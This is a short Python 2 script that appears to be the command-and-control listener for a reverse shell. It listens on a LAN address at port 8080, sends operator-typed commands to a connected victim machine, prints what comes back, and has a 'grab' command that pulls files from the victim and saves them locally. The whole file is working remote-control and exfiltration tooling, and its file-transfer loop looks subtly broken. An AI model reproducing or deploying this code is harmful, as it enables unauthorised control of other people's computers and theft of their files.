import socket
import os



def transfer(conn,command):
    conn.send(command)
    f=open('/home/chen/Desktop/test.png','wb')
    while True:
        bits=conn.recv(1024)
        if  'unable to find out the file' in bits:
            print("unable to find out the file")
            break
        if bits.endswith('DONE'):
            print ("transfer completed")
            f.close()
        f.write(bits)


def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("192.168.43.91",8080))

    s.listen(1)

    print ("Listening for incoming TCP con on port 8080")

    conn,addr=s.accept()

    print ("We got a connection from: ",addr)



    while True:
        command = raw_input("shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn,command)
        else:
            conn.send(command)
            print (conn.recv(1024))

def main():
    connect()

main()
